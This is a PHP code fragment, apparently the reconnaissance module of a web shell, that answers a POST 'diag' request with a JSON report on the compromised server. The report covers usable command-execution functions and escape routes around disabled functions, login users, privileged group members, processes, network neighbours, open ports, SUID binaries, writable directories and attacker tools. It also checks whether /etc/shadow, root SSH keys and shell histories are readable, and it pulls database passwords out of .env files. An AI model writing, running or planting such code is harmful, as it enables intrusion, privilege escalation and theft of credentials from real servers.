if (isset($_POST['action']) && $_POST['action'] === 'diag') {
ob_end_clean();
header('Content-Type: application/json');

// --- PHP / server basics ---
$dangerous = ['exec','shell_exec','system','passthru','popen','proc_open','pcntl_exec','mail','putenv','imap_open','dl','ffi','error_log','mb_send_mail'];
$funcs = [];
foreach ($dangerous as $f) $funcs[$f] = function_exists($f);
$exts = ['FFI','imap','sockets','posix','pcntl','openssl','sqlite3','phar','zip'];
$extList = [];
foreach ($exts as $e) $extList[$e] = extension_loaded($e);

// --- Current process identity ---
$uid = function_exists('posix_getuid') ? posix_getuid() : 0;
$gid = function_exists('posix_getgid') ? posix_getgid() : 0;
$pwent = function_exists('posix_getpwuid') ? @posix_getpwuid($uid) : false;
$grent = function_exists('posix_getgrgid') ? @posix_getgrgid($gid) : false;
$groups = function_exists('posix_getgroups') ? (@posix_getgroups() ?: []) : [];
$groupNames = [];
foreach ($groups as $g) {
$gi = function_exists('posix_getgrgid') ? @posix_getgrgid($g) : false;
if ($gi) $groupNames[] = $gi['name'] . '(' . $g . ')';
}

// --- /etc/passwd users with login shells ---
$passwdUsers = [];
$passwdRaw = @file_get_contents('/etc/passwd') ?: '';
foreach (explode("\n", $passwdRaw) as $line) {
$p = explode(':', $line);
if (count($p) >= 7 && !in_array($p[6], ['/usr/sbin/nologin','/bin/false','/sbin/nologin',''])) {
$passwdUsers[] = ['user'=>$p[0],'uid'=>$p[2],'gid'=>$p[3],'home'=>$p[5],'shell'=>$p[6]];
}
}

// --- /etc/group membership ---
$groupsRaw = @file_get_contents('/etc/group') ?: '';
$interestingGroups = ['sudo','wheel','lxd','docker','adm','shadow','disk'];
$groupMemberships = [];
foreach (explode("\n", $groupsRaw) as $line) {
$p = explode(':', $line);
if (count($p) >= 4 && in_array($p[0], $interestingGroups) && trim($p[3]) !== '') {
$groupMemberships[$p[0]] = array_filter(explode(',', $p[3]));
}
}

// --- Running processes ---
$processes = [];
foreach (@glob('/proc/[0-9]*') ?: [] as $pidDir) {
$cmd = @file_get_contents($pidDir . '/cmdline');
$stat = @file_get_contents($pidDir . '/status');
if (!$cmd) continue;
$cmd = str_replace("\0", ' ', trim($cmd));
$uid_proc = '';
if (preg_match('/^Uid:\s+(\d+)/m', $stat, $m)) $uid_proc = $m[1];
$processes[] = ['pid' => basename($pidDir), 'uid' => $uid_proc, 'cmd' => substr($cmd, 0, 120)];
}

// --- Network: ARP table ---
$arpRaw = @file_get_contents('/proc/net/arp') ?: '';
$arpHosts = [];
foreach (array_slice(explode("\n", $arpRaw), 1) as $line) {
$parts = preg_split('/\s+/', trim($line));
if (count($parts) >= 4 && $parts[0] !== '') {
$arpHosts[] = ['ip'=>$parts[0], 'mac'=>$parts[3], 'dev'=>$parts[5] ?? ''];
}
}

// --- Network: open ports (TCP) ---
$tcpRaw = @file_get_contents('/proc/net/tcp') ?: '';
$openPorts = [];
foreach (array_slice(explode("\n", $tcpRaw), 1) as $line) {
$parts = preg_split('/\s+/', trim($line));
if (count($parts) >= 4 && $parts[3] === '0A') {
$hex = explode(':', $parts[1]);
if (isset($hex[1])) $openPorts[] = hexdec($hex[1]);
}
}
sort($openPorts);

// --- Network: routing table ---
$routeRaw = @file_get_contents('/proc/net/route') ?: '';
$routes = [];
foreach (array_slice(explode("\n", $routeRaw), 1) as $line) {
$p = preg_split('/\s+/', trim($line));
if (count($p) >= 4 && $p[1] !== '') {
$dest = long2ip(hexdec(strrev(hex2bin(str_pad($p[1],8,'0',STR_PAD_LEFT)))));
$gw = long2ip(hexdec(strrev(hex2bin(str_pad($p[2],8,'0',STR_PAD_LEFT)))));
$mask = long2ip(hexdec(strrev(hex2bin(str_pad($p[7],8,'0',STR_PAD_LEFT)))));
$routes[] = ['iface'=>$p[0],'dest'=>$dest,'gw'=>$gw,'mask'=>$mask];
}
}

// --- Interesting readable files ---
$sensitiveFiles = [
'/etc/passwd', '/etc/shadow', '/etc/sudoers',
'/root/.ssh/id_rsa', '/root/.ssh/authorized_keys', '/root/.bash_history',
'/home/*/.ssh/id_rsa', '/home/*/.bash_history',
'/.env', getcwd() . '/.env', getcwd() . '/../.env',
];
$readable = [];
foreach ($sensitiveFiles as $pattern) {
foreach (@glob($pattern) ?: [$pattern] as $f) {
if (@is_readable($f)) $readable[] = $f;
}
}

// --- SUID binaries ---
$suidBins = [];
foreach (@glob('/bin/*') ?: [] as $f) {
if (@fileperms($f) & 0x800) $suidBins[] = $f;
}
foreach (@glob('/sbin/*') ?: [] as $f) {
if (@fileperms($f) & 0x800) $suidBins[] = $f;
}
foreach (@glob('/usr/bin/*') ?: [] as $f) {
if (@fileperms($f) & 0x800) $suidBins[] = $f;
}
foreach (@glob('/usr/sbin/*') ?: [] as $f) {
if (@fileperms($f) & 0x800) $suidBins[] = $f;
}
foreach (@glob('/usr/local/bin/*') ?: [] as $f) {
if (@fileperms($f) & 0x800) $suidBins[] = $f;
}

// --- Writable directories ---
$writableDirs = [];
foreach (['/tmp','/var/tmp','/dev/shm','/run/shm',getcwd(),'/var/www','/www/wwwroot'] as $d) {
if (@is_writable($d)) $writableDirs[] = $d;
}

// --- Available interpreters / tools ---
$tools = ['python3','python','perl','ruby','php','nc','curl','wget','gcc','cc','make','git','bash','sh','nmap'];
$availTools = [];
foreach ($tools as $t) {
foreach (['/usr/bin','/usr/local/bin','/bin'] as $binDir) {
if (@file_exists("$binDir/$t")) { $availTools[] = "$binDir/$t"; break; }
}
}

// --- Installed panel / hosting ---
$panels = [
'BT Panel' => '/www/server/panel',
'cPanel' => '/usr/local/cpanel',
'Plesk' => '/usr/local/psa',
'DirectAdmin' => '/usr/local/directadmin',
'HestiaCP' => '/usr/local/hestia',
'ISPConfig' => '/usr/local/ispconfig',
'Zend Server' => '/usr/local/zend',
];
$detectedPanels = [];
foreach ($panels as $name => $path) {
if (@file_exists($path)) $detectedPanels[] = $name . ' (' . $path . ')';
}

// --- MySQL credentials from common locations ---
$dbCreds = [];
$envFiles = [getcwd().'/.env', getcwd().'/../.env', '/var/www/.env'];
foreach ($envFiles as $ef) {
$content = @file_get_contents($ef);
if (!$content) continue;
preg_match('/^DB_PASSWORD=(.+)/m', $content, $m);
preg_match('/^DB_USERNAME=(.+)/m', $content, $u);
preg_match('/^DB_HOST=(.+)/m', $content, $h);
if ($m) $dbCreds[$ef] = ['host'=>trim($h[1]??''),'user'=>trim($u[1]??''),'pass'=>trim($m[1]??'')];
}

echo json_encode([
'php_version' => phpversion(),
'os' => php_uname(),
'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
'disable_functions' => ini_get('disable_functions') ?: 'none',
'open_basedir' => ini_get('open_basedir') ?: 'none',
'allow_url_fopen' => ini_get('allow_url_fopen'),
'sendmail_path' => ini_get('sendmail_path') ?: 'none',
'user' => get_current_user(),
'uid' => $uid,
'gid' => $gid,
'user_name' => $pwent['name'] ?? '?',
'group_name' => $grent['name'] ?? '?',
'groups' => implode(', ', $groupNames),
'cwd' => getcwd() ?: '?',
'disk_free' => @disk_free_space('.') ?: 0,
'disk_total' => @disk_total_space('.') ?: 0,
'functions' => $funcs,
'extensions' => $extList,
'passwd_users' => $passwdUsers,
'group_memberships' => $groupMemberships,
'processes' => $processes,
'arp_hosts' => $arpHosts,
'open_ports' => $openPorts,
'routes' => $routes,
'readable_files' => $readable,
'suid_bins' => $suidBins,
'writable_dirs' => $writableDirs,
'tools' => $availTools,
'panels' => $detectedPanels,
'db_creds' => $dbCreds,
]);
exit;
}
